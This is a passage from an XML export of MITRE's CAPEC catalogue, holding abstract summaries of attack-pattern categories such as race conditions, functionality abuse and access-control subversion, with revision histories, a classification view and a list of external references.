               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Relationships</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-01-09">Deceptive Interactions</Previous_Entry_Name>
         </Content_History>
      </Category>
      <Category ID="172" Name="Manipulate Timing and State" Status="Stable">
         <Summary>An attacker exploits weaknesses in timing or state maintaining functions to perform actions that would otherwise be prevented by the execution flow of the target code and processes. An example of a state attack might include manipulation of an application's information to change the apparent credentials or similar information, possibly allowing the application to access material it would not normally be allowed to access. A common example of a timing attack is a test-action race condition where some state information is tested and, if it passes, an action is performed. If the attacker can change the state between the time that the application performs the test and the time the action is performed, then they might be able to manipulate the outcome of the action to malicious ends.</Summary>
         <Relationships>
            <Has_Member CAPEC_ID="25"/>
            <Has_Member CAPEC_ID="26"/>
            <Has_Member CAPEC_ID="74"/>
         </Relationships>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Relationships</Modification_Comment>
            </Modification>
         </Content_History>
      </Category>
      <Category ID="210" Name="Abuse Existing Functionality" Status="Stable">
         <Summary>An adversary uses or manipulates one or more functions of an application in order to achieve a malicious objective not originally intended by the application, or to deplete a resource to the point that the target's functionality is affected. This is a broad class of attacks wherein the adversary is able to alter the intended result or purpose of the functionality and thereby affect application behavior or information integrity. Outcomes can range from information exposure, vandalism, degrading or denial of service, as well as execution of arbitrary code on the target machine.</Summary>
         <Relationships>
            <Has_Member CAPEC_ID="113"/>
            <Has_Member CAPEC_ID="125"/>
            <Has_Member CAPEC_ID="130"/>
            <Has_Member CAPEC_ID="131"/>
            <Has_Member CAPEC_ID="212"/>
            <Has_Member CAPEC_ID="216"/>
            <Has_Member CAPEC_ID="227"/>
            <Has_Member CAPEC_ID="272"/>
            <Has_Member CAPEC_ID="554"/>
         </Relationships>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Description, Relationships, Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Description, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Relationships</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-01-09">Abuse of Functionality</Previous_Entry_Name>
         </Content_History>
      </Category>
      <Category ID="223" Name="Employ Probabilistic Techniques" Status="Stable">
         <Summary>An attacker utilizes probabilistic techniques to explore and overcome security properties of the target that are based on an assumption of strength due to the extremely low mathematical probability that an attacker would be able to identify and exploit the very rare specific conditions under which those security properties do not hold.</Summary>
         <Relationships>
            <Has_Member CAPEC_ID="112"/>
            <Has_Member CAPEC_ID="28"/>
         </Relationships>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Relationships</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-01-09">Probabilistic Techniques</Previous_Entry_Name>
         </Content_History>
      </Category>
      <Category ID="225" Name="Subvert Access Control" Status="Stable">
         <Summary>An attacker actively targets exploitation of weaknesses, limitations and assumptions in the mechanisms a target utilizes to manage identity and authentication as well as manage access to its resources or authorize functionality. Such exploitation can lead to the complete subversion of any trust the target system may have in the identity of any entity with which it interacts, or the complete subversion of any control the target has over its data or functionality. Weaknesses targeted by subversion of authorization controls are often due to three primary factors: 1) a fundamental dependence on authentication mechanisms being effective; 2) a lack of effective control over the separation of privilege between various entities; and 3) assumptions and over confidence in the strength or rigor of the implemented authorization mechanisms.</Summary>
         <Relationships>
            <Has_Member CAPEC_ID="21"/>
            <Has_Member CAPEC_ID="114"/>
            <Has_Member CAPEC_ID="115"/>
            <Has_Member CAPEC_ID="22"/>
            <Has_Member CAPEC_ID="122"/>
            <Has_Member CAPEC_ID="233"/>
            <Has_Member CAPEC_ID="390"/>
            <Has_Member CAPEC_ID="507"/>
         </Relationships>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Description, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Description</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-01-09">Exploitation of Authentication</Previous_Entry_Name>
         </Content_History>
      </Category>
      <Category ID="255" Name="Manipulate Data Structures" Status="Stable">
         <Summary>Attack patterns in this category manipulate and exploit characteristics of system data structures in order to violate the intended usage and protections of these structures. This is done in such a way that yields either improper access to the associated system data or violations of the security properties of the system itself due to vulnerabilities in how the system processes and manages the data structures. Often, vulnerabilities and therefore exploitability of these data structures exist due to ambiguity and assumption in their design and prescribed handling.</Summary>
         <Relationships>
            <Has_Member CAPEC_ID="123"/>
            <Has_Member CAPEC_ID="124"/>
            <Has_Member CAPEC_ID="129"/>
            <Has_Member CAPEC_ID="153"/>
         </Relationships>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Description, Relationships</Modification_Comment>
            </Modification>
         </Content_History>
      </Category>
      <Category ID="262" Name="Manipulate System Resources" Status="Stable">
         <Summary>Attack patterns within this category focus on the adversary's ability to manipulate one or more resources in order to achieve a desired outcome. This is a broad class of attacks wherein the attacker is able to change some aspect of a resource's state or availability and thereby affect system behavior or information integrity. Examples of resources include files, applications, libraries, infrastructure, and configuration information. Outcomes can range from vandalism and reduction in service to the execution of arbitrary code on the target machine.</Summary>
         <Relationships>
            <Has_Member CAPEC_ID="184"/>
            <Has_Member CAPEC_ID="440"/>
            <Has_Member CAPEC_ID="161"/>
            <Has_Member CAPEC_ID="165"/>
            <Has_Member CAPEC_ID="176"/>
            <Has_Member CAPEC_ID="607"/>
            <Has_Member CAPEC_ID="438"/>
            <Has_Member CAPEC_ID="439"/>
            <Has_Member CAPEC_ID="441"/>
            <Has_Member CAPEC_ID="548"/>
         </Relationships>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Description, Relationships</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-01-09">Manipulate Resources</Previous_Entry_Name>
         </Content_History>
      </Category>
   </Categories>
   <Views>
      <View ID="1000" Name="Mechanisms of Attack" Type="Graph" Status="Stable">
         <Objective>This view organizes attack patterns hierarchically based on mechanisms that are frequently employed when exploiting a vulnerability. The categories that are members of this view represent the different techniques used to attack a system. They do not, however, represent the consequences or goals of the attacks. There exists the potential for some attack patterns to align with more than one category depending on one’s perspective. To counter this, emphasis was placed such that attack patterns as presented within each category use a technique not sometimes, but without exception.</Objective>
         <Members>
            <Has_Member CAPEC_ID="156"/>
            <Has_Member CAPEC_ID="210"/>
            <Has_Member CAPEC_ID="255"/>
            <Has_Member CAPEC_ID="262"/>
            <Has_Member CAPEC_ID="152"/>
            <Has_Member CAPEC_ID="223"/>
            <Has_Member CAPEC_ID="172"/>
            <Has_Member CAPEC_ID="118"/>
            <Has_Member CAPEC_ID="225"/>
         </Members>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated View_Objective</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Relationships, View_Objective</Modification_Comment>
            </Modification>
         </Content_History>
      </View>
   </Views>
   <External_References>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-1">
         <Author>G. Hoglund</Author>
         <Author>G. McGraw</Author>
         <Title>Exploiting Software: How to Break Code</Title>
         <Publication_Year>2004</Publication_Year>
         <Publication_Month>--02</Publication_Month>
         <Publisher>Addison-Wesley</Publisher>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-10">
         <Title>WASC Threat Classification 2.0</Title>
         <Publication_Year>2010</Publication_Year>
         <Publisher>The Web Application Security Consortium (WASC)</Publisher>
         <URL>http://projects.webappsec.org/w/page/13246952/Path-Traversal</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-101">
         <Title>Wikipedia</Title>
         <Publisher>The Wikimedia Foundation, Inc</Publisher>
         <URL>http://en.wikipedia.org/wiki/Deadlock</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-102">
         <Author>Robin Cover, ed.</Author>
         <Title>XML and Web Services In The News</Title>
         <Publication>XML Daily Newslink</Publication>
         <URL>http://www.xml.org/xml/news/archives/archive.11292006.shtml</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-103">
         <Title>Simple Object Access Protocol (SOAP) 1.1</Title>
         <Publication_Year>2006</Publication_Year>
         <Publication_Month>--11</Publication_Month>
         <Publication_Day>---29</Publication_Day>
         <Publisher>W3C</Publisher>
         <URL>http://www.w3.org/TR/2000/NOTE-SOAP-20000508/#_Toc478383522</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-105">
         <Title>Wikipedia</Title>
         <Publisher>The Wikimedia Foundation, Inc</Publisher>
         <URL>http://en.wikipedia.org/wiki/Race_condition</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-106">
         <Author>David Wheeler</Author>
         <Title>Secure programmer: Prevent race conditions</Title>
         <Publication>IBM developerWorks</Publication>
         <Publisher>IBM</Publisher>
         <URL>http://www.ibm.com/developerworks/linux/library/l-sprace/index.html</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-107">
         <Author>Fortify Software</Author>
         <Title>SAMATE - Software Assurance Metrics And Tool Evaluation</Title>
         <Publication_Year>2006</Publication_Year>
         <Publication_Month>--06</Publication_Month>
         <Publication_Day>---22</Publication_Day>
         <Publisher>National Institute of Standards and Technology (NIST)</Publisher>
         <URL>http://samate.nist.gov/SRD/view_testcase.php?tID=1598</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-108">
         <Title>WASC Threat Classification 2.0</Title>
         <Publication_Year>2010</Publication_Year>
         <Publisher>The Web Application Security Consortium (WASC)</Publisher>
         <URL>http://projects.webappsec.org/Improper-Input-Handling</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-109">
         <Title>OWASP</Title>
         <Publisher>The Open Web Application Security Project (OWASP)</Publisher>
         <URL>http://www.owasp.org/index.php/Category:Encoding</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-11">
         <Title>WASC Threat Classification 2.0</Title>
         <Publication_Year>2010</Publication_Year>
         <Publisher>The Web Application Security Consortium (WASC)</Publisher>
         <URL>http://projects.webappsec.org/Directory-Indexing</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-110">
         <Title>OWASP</Title>
         <Publisher>The Open Web Application Security Project (OWASP)</Publisher>
         <URL>http://www.owasp.org/index.php/Canonicalization,_locale_and_Unicode</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-111">
         <Title>OWASP</Title>
         <Publisher>The Open Web Application Security Project (OWASP)</Publisher>
         <URL>http://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-112">
         <Author>David Wheeler</Author>
         <Title>Secure Programming for Linux and Unix HOWTO</Title>
         <URL>http://www.dwheeler.com/secure-programs/Secure-Programs-HOWTO/character-encoding.html</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-113">
         <Title>Wikipedia</Title>
         <Publisher>The Wikimedia Foundation, Inc</Publisher>
         <URL>http://en.wikipedia.org/wiki/Character_encoding</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-114">
         <Author>Eric Hacker</Author>
         <Title>IDS Evasion with Unicode</Title>
         <Publication_Year>2001</Publication_Year>
         <Publication_Month>--01</Publication_Month>
         <Publication_Day>---03</Publication_Day>
         <URL>http://www.securityfocus.com/infocus/1232</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-115">
         <Title>Wikipedia</Title>
         <Publisher>The Wikimedia Foundation, Inc</Publisher>
         <URL>http://en.wikipedia.org/wiki/Symlink_race</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-116">
         <Title>mkstemp</Title>
         <Edition>IEEE Std 1003.1, 2004 Edition</Edition>
         <Publication>The Open Group Base Specifications Issue 6</Publication>
         <URL>http://www.opengroup.org/onlinepubs/009695399/functions/mkstemp.html</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-117">
         <Title>HTTP Response Smuggling</Title>
         <Publisher>Beyond Security</Publisher>
         <URL>http://www.securiteam.com/securityreviews/5CP0L0AHPC.html</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-118">
         <Author>Arshan Dabirsiaghi</Author>
         <Title>Bypassing Web Authentication and Authorization with HTTP Verb Tampering: How to inadvertently allow attackers full access to your web application</Title>
         <Publisher>Aspect Security</Publisher>
         <URL>http://mirror.transact.net.au/sourceforge/w/project/wa/waspap/waspap/Core/Bypassing_VBAAC_with_HTTP_Verb_Tampering.pdf</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-119">
         <Author>Collin Jackson</Author>
         <Author>Adam Barth</Author>
         <Author>Andrew Bortz</Author>
         <Author>Weidong Shao</Author>
         <Author>Dan Boneh</Author>
         <Title>Protecting Browsers from DNS Rebinding Attacks</Title>
         <Publication>In Proceedings of ACM CCS 07</Publication>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-120">
         <Title>Wikipedia</Title>
         <Publisher>The Wikimedia Foundation, Inc</Publisher>
         <URL>http://en.wikipedia.org/wiki/DNS_rebinding</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-121">
         <Author>Navya Sidharth</Author>
         <Author>Jigang Liu</Author>
         <Title>Intrusion Resistant SOAP Messaging with IAPF</Title>
         <Publication_Year>2008</Publication_Year>
         <Publication_Month>--12</Publication_Month>
         <Publisher>IEEE</Publisher>
         <URL>http://ieeexplore.ieee.org/document/4780783/</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-123">
         <Author>J. Postel</Author>
         <Title>RFC792 - Internet Control Messaging Protocol</Title>
         <Publication_Year>1981</Publication_Year>
         <Publication_Month>--09</Publication_Month>
         <Publisher>Defense Advanced Research Projects Agency (DARPA)</Publisher>
         <URL>http://www.faqs.org/rfcs/rfc792.html</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-124">
         <Author>R. Braden, Ed.</Author>
         <Title>RFC1122 - Requirements for Internet Hosts - Communication Layers</Title>
         <Publication_Year>1989</Publication_Year>
         <Publication_Month>--10</Publication_Month>
         <URL>http://www.faqs.org/rfcs/rfc1122.html</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-125">
         <Author>Mark Wolfgang</Author>
         <Title>Host Discovery with Nmap</Title>
         <Publication_Year>2002</Publication_Year>
         <Publication_Month>--11</Publication_Month>
         <URL>http://nmap.org/docs/discovery.pdf</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-128">
         <Author>Defense Advanced Research Projects Agency Information Processing Techniques Office</Author>
         <Author>Information Sciences Institute University of Southern California</Author>
         <Title>RFC793 - Transmission Control Protocol</Title>
         <Publication_Year>1981</Publication_Year>
         <Publication_Month>--09</Publication_Month>
         <Publisher>Defense Advanced Research Projects Agency (DARPA)</Publisher>
         <URL>http://www.faqs.org/rfcs/rfc793.html</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-13">
         <Author>Shaun Colley</Author>
         <Title>Crafting Symlinks for Fun and Profit</Title>
         <URL>http://www.infosecwriters.com/texts.php?op=display&amp;id=159</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-130">
         <Author>Gordon "Fyodor" Lyon</Author>
         <Title>The Art of Port Scanning</Title>
         <Edition>Volume: 7, Issue. 51</Edition>
         <Publication>Phrack Magazine</Publication>
         <Publication_Year>1997</Publication_Year>
         <URL>http://phrack.org/issues/51/11.html</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-131">
         <Author>J. Viega</Author>
         <Author>G. McGraw</Author>
         <Title>Building Secure Software</Title>
         <Publication_Year>2002</Publication_Year>
         <Publisher>Addison-Wesley</Publisher>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-139">
         <Author>J. Mogul</Author>
         <Author>J. Postel</Author>
         <Title>RFC950 - Internet Standard Subnetting Procedure</Title>
         <Publication_Year>1985</Publication_Year>
         <Publication_Month>--08</Publication_Month>
         <URL>http://www.faqs.org/rfcs/rfc950.html</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-14">
         <Author>Hal Burch</Author>
         <Author>Brendan Saulsbury</Author>
         <Title>FIO30-C. Exclude user input from format strings</Title>
         <Publication_Year>2011</Publication_Year>
         <Publication_Month>--05</Publication_Month>
         <Publisher>CERT</Publisher>
         <URL>https://www.securecoding.cert.org/confluence/display/seccode/FIO30-C.+Exclude+user+input+from+format+strings</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-147">
         <Author>Gordon "Fyodor" Lyon</Author>
         <Title>Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning</Title>
         <Edition>3rd "Zero Day" Edition</Edition>
         <Publication_Year>2008</Publication_Year>
         <Publisher>Insecure.com LLC, ISBN: 978-0-9799587-1-7</Publisher>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-15">
         <Author>Robert Auger</Author>
         <Title>WASC Threat Classification 2.0</Title>
         <Publisher>The Web Application Security Consortium (WASC)</Publisher>
         <URL>http://projects.webappsec.org/Format-String</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-158">
         <Author>J. Postel</Author>
         <Title>RFC768 - User Datagram Protocol</Title>
         <Publication_Year>1980</Publication_Year>
         <Publication_Month>--08</Publication_Month>
         <Publication_Day>---28</Publication_Day>
         <URL>http://www.faqs.org/rfcs/rfc768.html</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-16">
         <Author>Fortify</Author>
         <Title>The OWASP Application Security Desk Reference</Title>
         <Publication_Year>2010</Publication_Year>
         <Publisher>The Open Web Application Security Project (OWASP)</Publisher>
         <URL>https://www.owasp.org/index.php/Format_String</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-17">
         <Title>WASC Threat Classification 2.0</Title>
         <Publication_Year>2010</Publication_Year>
         <Publisher>The Web Application Security Consortium (WASC)</Publisher>
         <URL>http://projects.webappsec.org/LDAP-Injection</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-2">
         <Title>Sharefuzz</Title>
         <URL>http://sharefuzz.sourceforge.net</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-212">
         <Author>Gordon "Fyodor" Lyon</Author>
         <Title>Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning</Title>
         <Edition>3rd "Zero Day" Edition,</Edition>
         <Publication_Year>2008</Publication_Year>
         <Publisher>Insecure.com LLC</Publisher>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-22">
         <Title>Wikipedia</Title>
         <Publisher>The Wikimedia Foundation, Inc</Publisher>
         <URL>http://en.wikipedia.org/wiki/DNS_cache_poisoning</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-23">
         <Title>DNS Threats and DNS Weaknesses</Title>
         <Publisher>DNSSEC</Publisher>
         <URL>http://www.dnssec.net/dns-threats.php</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-24">
         <Title>Wikipedia</Title>
         <Publisher>The Wikimedia Foundation, Inc</Publisher>
         <URL>http://en.wikipedia.org/wiki/ARP_spoofing</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-262">
         <Author>Ofir Arkin</Author>
         <Title>A Remote Active OS Fingerprinting Tool using ICMP</Title>
         <Publication_Year>2002</Publication_Year>
         <Publication_Month>--04</Publication_Month>
         <Publisher>The Sys-Security Group</Publisher>
         <URL>http://ofirarkin.files.wordpress.com/2008/11/login.pdf</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-27">
         <Title>Vulnerability Note VU#800113</Title>
         <Publication_Year>2008</Publication_Year>
         <Publication_Month>--07</Publication_Month>
         <Publication_Day>---08</Publication_Day>
         <Publisher>US CERT</Publisher>
         <URL>http://www.kb.cert.org/vuls/id/800113#pat</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-29">
         <Author>Silvio Cesare</Author>
         <Title>Share Library Call Redirection Via ELF PLT Infection</Title>
         <Edition>Issue 56</Edition>
         <Publication>Phrack Magazine</Publication>
         <Publication_Year>2000</Publication_Year>
         <URL>http://phrack.org/issues/56/7.html</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-3">
         <Author>Jeremiah Grossman</Author>
         <Title>Cross-Site Tracing (XST)</Title>
         <Publication_Year>2003</Publication_Year>
         <Publisher>WhiteHat Security</Publisher>
         <URL>http://www.cgisecurity.com/whitehat-mirror/WH-WhitePaper_XST_ebook.pdf</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-30">
         <Title>OWASP Top 10</Title>
         <Edition>2007</Edition>
         <Publisher>The Open Web Application Security Project (OWASP)</Publisher>
         <URL>https://www.owasp.org/index.php/Top_10_2007-A3</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-31">
         <Author>Manic Velocity</Author>
         <Title>Footprinting And The Basics Of Hacking</Title>
         <Publication>Web Textfiles</Publication>
         <URL>http://web.textfiles.com/hacking/footprinting.txt</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-32">
         <Author>Eddie Sutton</Author>
         <Title>Footprint: What Is And How Do You Erase Them</Title>
         <URL>http://www.infosecwriters.com/text_resources/pdf/Footprinting.pdf</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-327">
         <Author>Tom Stracener</Author>
         <Author>Sean Barnum</Author>
         <Title>So Many Ways [...]: Exploiting Facebook and YoVille</Title>
         <Publication_Year>2010</Publication_Year>
         <Publisher>Defcon 18</Publisher>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-33">
         <Author>Stuart McClure</Author>
         <Author>Joel Scambray</Author>
         <Author>George Kurtz</Author>
         <Title>Hacking Exposed: Network Security Secrets &amp; Solutions</Title>
         <Edition>6th Edition</Edition>
         <Publication_Year>2009</Publication_Year>
         <Publisher>McGraw Hill</Publisher>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-34">
         <Author>Gordon "Fyodor" Lyon</Author>
         <Title>Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning</Title>
         <Edition>3rd "Zero Day" Edition,</Edition>
         <Publication_Year>2008</Publication_Year>
         <Publisher>Insecure.com LLC, ISBN: 978-0-9799587-1-7</Publisher>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-348">
         <Title>The Official Social Engineering Portal</Title>
         <Publication>Social-Engineer.org</Publication>
         <Publisher>Tick Tock Computers, LLC</Publisher>
         <URL>http://www.social-engineer.org</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-36">
         <Author>Saumil Shah</Author>
         <Title>An Introduction to HTTP fingerprinting</Title>
         <URL>http://www.net-square.com/httprint_paper.html</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-360">
         <Title>Social Engineering: The Art of Human Hacking</Title>
         <Publication>2010</Publication>
         <Publisher>Wiley</Publisher>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-364">
         <Title>CERT Advisory CA-1997-05 MIME Conversion Buffer Overflow in Sendmail Versions 8.8.3 and 8.8.4</Title>
         <Publisher>Software Engineering Institute: Carnegie Mellon University</Publisher>
         <URL>http://www.cert.org/advisories/CA-1997-05.html</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-37">
         <Title>OWASP Testing Guide</Title>
         <Edition>v4 [DRAFT]</Edition>
         <Publisher>The Open Web Application Security Project (OWASP)</Publisher>
         <URL>http://www.owasp.org/index.php/Testing_for_Web_Application_Fingerprint_%28OWASP-IG-004%29</URL>
      </External_Reference>
      <External_Reference xmlns:capec="http://capec.mitre.org/capec-3" Reference_ID="REF-379">
         <Author>Information Technology Laboratory</Author>
